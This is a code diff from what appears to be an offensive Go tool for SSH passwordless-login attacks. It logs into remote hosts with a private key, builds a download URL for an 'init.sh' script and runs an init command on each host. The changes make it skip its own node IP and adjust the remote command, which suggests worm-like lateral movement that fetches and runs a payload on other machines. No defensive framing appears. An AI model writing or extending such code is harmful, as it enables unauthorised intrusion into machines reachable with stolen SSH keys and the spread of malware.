@@ -14,6 +14,7 @@ var SSHNOPassWordLoginAttackType = "SSHNoPasswdLoginAttack"
 var SSHNoPassWordLoginAttackName = "ssh_nopasswd_login_attack"
 
 type UnixSSHLoginAttack struct {
+
 	attackTasks *attack.AttackTasks
 
 	loginInfo *local.SSHLoginInfo
@@ -62,7 +63,7 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 		host = sshHost.Host()
 	}
 
-	if host == "" {
+	if host == "" ||host == slog.attackTasks.GetNodeIP() {
 		return
 	}
 
@@ -71,7 +72,6 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 	if port <= 0 {
 		port = 22
 	}
-
 
 	log.Printf("Try to  use ssh login remote host:%s:%d,with private key:%s",host,port,privkey)
 
@@ -89,9 +89,9 @@ func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {
 
 	initUrl := slog.attackTasks.DownloadInitUrl(host, port, SSHNOPassWordLoginAttackType, "init.sh")
 
-	cmd := slog.attackTasks.InitCmdForLinux(initUrl)
+	cmd := slog.attackTasks.InitCmdForLinux(initUrl,SSHNOPassWordLoginAttackType)
 
-	result, err := sshClient.RunCmd(cmd)
+	result, err := sshClient.RunCmd(cmd+" true")
 
 	if err != nil {
 
